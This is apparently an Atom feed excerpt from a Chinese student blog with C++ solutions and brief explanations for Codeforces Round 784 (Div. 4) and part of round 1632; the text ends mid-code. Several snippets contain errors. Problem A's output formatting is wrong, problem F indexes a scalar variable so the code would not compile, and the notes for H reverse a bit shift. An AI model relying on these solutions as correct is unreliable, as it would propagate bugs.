    <link href="http://zzuzyj.github.io/2022/05/03/CF1669(Div_4)/"/>
    <id>http://zzuzyj.github.io/2022/05/03/CF1669(Div_4)/</id>
    <published>2022-05-03T09:23:29.814Z</published>
    <updated>2022-04-24T11:01:48.000Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#codeforces-round-784-div-4">Codeforces Round #784 (Div. 4)</a><ul><li><a href="#a-division">A Division?</a></li><li><a href="#b-triple">B Triple</a></li><li><a href="#c-oddeven-increments">C Odd/Even Increments</a></li><li><a href="#d-colorful-stamp">D. Colorful Stamp</a></li><li><a href="#e-2-letter-strings">E. 2-Letter Strings</a></li><li><a href="#f-eating-candies">F. Eating Candies</a></li><li><a href="#g-fall-down">G. Fall Down</a></li><li><a href="#h-maximal-and">H. Maximal AND</a></li></ul></li></ul><!-- tocstop --><h1><span id="codeforces-round-784-div-4">Codeforces Round #784 (Div. 4)</span></h1><p><strong>新人菜鸡，没有ak，说实话题目英语真没看懂，来补个题</strong></p><h2><span id="a-division">A  Division?</span></h2><p><strong>简单if else判断语句</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">   <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">       cout&lt;&lt;<span class="string">&quot;Division &quot;</span>&lt;&lt;endl;</span><br><span class="line">       <span class="type">int</span> n;cin&gt;&gt;n;</span><br><span class="line">       <span class="keyword">if</span>(n&gt;=<span class="number">1900</span>)cout&lt;&lt;<span class="number">1</span>&lt;&lt;endl;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">1600</span>)cout&lt;&lt;<span class="number">2</span>&lt;&lt;endl;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">1400</span>)cout&lt;&lt;<span class="number">3</span>&lt;&lt;endl;</span><br><span class="line">       <span class="keyword">else</span> cout&lt;&lt;<span class="number">4</span>&lt;&lt;endl;</span><br><span class="line">   &#125;       </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="b-triple">B  Triple</span></h2><p><strong>数据范围不大，直接可以用数组存数据，最后判定是否存在ans[i]&gt;=3,if ok ,输出 i，没有输出 -1</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">2</span>*<span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// freopen(&quot;out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">   <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">   <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">       <span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="built_in">sizeof</span>(ans));</span><br><span class="line">       <span class="type">int</span> n;cin&gt;&gt;n;</span><br><span class="line">       <span class="type">int</span> flag=<span class="number">-1</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">           <span class="type">int</span> t;cin&gt;&gt;t;</span><br><span class="line">           ans[t]++;</span><br><span class="line">           <span class="keyword">if</span>(ans[t]&gt;=<span class="number">3</span>)flag=t;</span><br><span class="line">       &#125;</span><br><span class="line">       cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="c-oddeven-increments">C  Odd/Even Increments</span></h2><p><strong>c题是个奇偶判定，要求奇数位必须都是奇数或偶数，偶数位必须也都是奇数或偶数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">1e3</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">   <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">   <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">       <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in">sizeof</span>(a));</span><br><span class="line">       <span class="type">int</span> n;cin&gt;&gt;n;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;a[i];</span><br><span class="line">       <span class="type">int</span> flag1=a[<span class="number">1</span>]%<span class="number">2</span>,flag2=a[<span class="number">2</span>]%<span class="number">2</span>,flag=<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=flag1)&#123;</span><br><span class="line">               flag=<span class="number">0</span>;<span class="keyword">break</span>;&#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=flag2)&#123;flag=<span class="number">0</span>;<span class="keyword">break</span>;&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(flag)cout&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;endl;</span><br><span class="line">       <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;endl;</span><br><span class="line">   &#125;            </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="d-colorful-stamp">D. Colorful Stamp</span></h2><p><strong>结论判定，如果一段区间被染色，必存在r,b两种颜色，o(n)扫一遍即可</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">char</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">// freopen(&quot;out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line"><span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line"><span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a+<span class="number">1</span>);</span><br><span class="line"><span class="type">bool</span> flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i]==<span class="string">&#x27;W&#x27;</span>)<span class="keyword">continue</span>;</span><br><span class="line"><span class="type">int</span> j=i;</span><br><span class="line"><span class="keyword">while</span>(j&lt;n&amp;&amp;a[j+<span class="number">1</span>]!=<span class="string">&#x27;W&#x27;</span>)j++;</span><br><span class="line"><span class="type">bool</span> flag1=<span class="number">0</span>,flag2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k]==<span class="string">&#x27;R&#x27;</span>)flag1=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(a[k]==<span class="string">&#x27;B&#x27;</span>)flag2=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(flag1&amp;&amp;flag2))flag=<span class="number">0</span>;</span><br><span class="line">i=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)<span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="e-2-letter-strings">E. 2-Letter Strings</span></h2><p><strong>我们可以统计只有出现重复字符的字符数，相同的话减去，用mp1存第一个位置，mp2存第二个位置，mp存字符串，出现过的话-mp[s]*2</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;mp1,mp2;</span><br><span class="line">map&lt;string,<span class="type">int</span>&gt;mp;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">// freopen(&quot;out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">    <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">    <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">    mp.<span class="built_in">clear</span>();mp1.<span class="built_in">clear</span>();mp2.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="type">int</span> n;cin&gt;&gt;n;<span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        string s;cin&gt;&gt;s;</span><br><span class="line">        ans+=((mp1[s[<span class="number">0</span>]]++)+(mp2[s[<span class="number">1</span>]]++)-(mp[s]++)*<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="f-eating-candies">F. Eating Candies</span></h2><p><strong>做一个前缀和，左右指针往中间走，判断sum[l]与sum[n]-sum[r-1] 的关系，如果大于，l++,如果等于 用ans记录答案=l+n+1-r,r—;其他r—</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">2</span>*<span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> sum[maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">// freopen(&quot;out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">   <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">   <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">       <span class="type">int</span> n,a;cin&gt;&gt;n;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;cin&gt;&gt;a;sum[i]=sum[i<span class="number">-1</span>]+a[i];&#125;</span><br><span class="line">       <span class="type">int</span> l=<span class="number">1</span>,r=n,ans=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">           <span class="keyword">if</span>(sum[l]&lt;(sum[n]-sum[r<span class="number">-1</span>]))l++;</span><br><span class="line">           <span class="keyword">else</span>  <span class="keyword">if</span>(sum[l]==(sum[n]-sum[r<span class="number">-1</span>]))ans=l+n-r+<span class="number">1</span>,r--;</span><br><span class="line">           <span class="keyword">else</span> r--;</span><br><span class="line">       &#125;</span><br><span class="line">       cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="g-fall-down">G. Fall Down</span></h2><p><strong>，初始化在每一列的下面加一块o，记录在o出现前的*的数量，最后直接给数组赋值即可，o上面一定全是石头，石头上到 o前全是.</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">55</span>;</span><br><span class="line"><span class="type">char</span> a[maxn][maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">   <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">       <span class="type">int</span> n,m;cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">        cin&gt;&gt;a[i][j];</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)a[n+<span class="number">1</span>][i]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> cnt=<span class="number">0</span>,st=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n+<span class="number">1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j][i]==<span class="string">&#x27;*&#x27;</span>)cnt++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(a[j][i]==<span class="string">&#x27;.&#x27;</span>)<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(a[j][i]==<span class="string">&#x27;o&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=st;k&lt;=j<span class="number">-1</span>;k++)&#123;</span><br><span class="line">                    a[k][i]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=j-cnt;k&lt;j;k++)&#123;</span><br><span class="line">                    a[k][i]=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                st=j+<span class="number">1</span>,cnt=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=m;j++)cout&lt;&lt;a[i][j];cout&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;&#125;</span><br><span class="line">   &#125;            </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="h-maximal-and">H. Maximal AND</span></h2><p><strong>思考or和and的定义，发现题目是让我们计算高位到地位的1的数，当然这只是前提，计算0-30每一位1</strong></p><p><strong>个数的和，如果为n，则此位的and值为 1&gt;&gt;j ,j为位数，只要把30-0扫一遍，判断k是否够用，ans+=1&gt;&gt;j即可</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">// freopen(&quot;out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">    <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">    <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">        <span class="type">int</span> n,k;cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">        <span class="type">int</span> cnt[<span class="number">35</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> t;cin&gt;&gt;t;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">30</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">1</span>&amp;(t&gt;&gt;i))cnt[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k&gt;=n-cnt[i])&#123;</span><br><span class="line">                k-=(n-cnt[i]);</span><br><span class="line">                ans+=<span class="number">1</span>&lt;&lt;i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#codeforces-round-784-div-4&quot;&gt;Codeforces Round #784 (Div. 4)&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#a-division&quot;&gt;A Division?&lt;/a&gt;</summary>
      
    
    
    
    <category term="acm" scheme="http://zzuzyj.github.io/categories/acm/"/>
    
    
    <category term="codeforces" scheme="http://zzuzyj.github.io/tags/codeforces/"/>
    
  </entry>
  
  <entry>
    <title>CF1632</title>
    <link href="http://zzuzyj.github.io/2022/05/03/CF1632/"/>
    <id>http://zzuzyj.github.io/2022/05/03/CF1632/</id>
    <published>2022-05-03T09:23:29.807Z</published>
    <updated>2022-04-27T08:05:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="cf1632">CF1632</span></h1><p>题目链接 ：<a href="http://codeforces.com/contest/1632">http://codeforces.com/contest/1632</a></p><h2><span id="a-abc">A ABC</span></h2><p>题目要求满足一串01字符串排列组合后不能有大于1长度的回文串，多举几组例子，发现无论0和1</p><p>谁的数量超过2，结果就是 no，抽屉原理可知n&gt;=3,时，结果一定为no，代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> tt;cin&gt;&gt;tt;</span><br><span class="line">  <span class="keyword">while</span>(tt--)&#123;</span><br><span class="line">    <span class="type">int</span> n;cin&gt;&gt;n;</span><br><span class="line">    string s;cin&gt;&gt;s;</span><br><span class="line">    <span class="keyword">if</span>(s[<span class="number">1</span>]==s[<span class="number">0</span>]||n&gt;=<span class="number">3</span>)cout&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="b-roof-construction">B. Roof Construction</span></h2><h2><span id="d-new-year-concert">D. New Year Concert</span></h2><p><strong>今天刚学了st表，这就用上了，这一题是二分+st表</strong></p><script type="math/tex; mode=display">当r的值确定时，gcd(a_l,a_{l+1},....,a_r)随着l递增，而r-l+1却是递减，则两条\\线必有1或0个交点，也就是说，对于每一个r，只可能有不存在或者仅有一个l使得gcd(a_l,a_{l+1},....,\\a_r)=r-l+1这两种情况，用ans[N]记录答案，st表记录区间gcd，对一个每一个r，用二\\分搜索是是否有满足条件的l,如果没有继承上一个状态，如果有，ans[i]=ans[whereL-1]+1;\\代码如下</script><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">200010</span>;</span><br><span class="line"><span class="type">int</span> a[N],lg[N],f[N][<span class="number">20</span>],ans[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;<span class="keyword">return</span> b==<span class="number">0</span>?a:<span class="built_in">gcd</span>(b,a%b);&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> k=lg[r-l+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gcd</span>(f[l][k],f[r-(<span class="number">1</span>&lt;&lt;k)+<span class="number">1</span>][k]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span 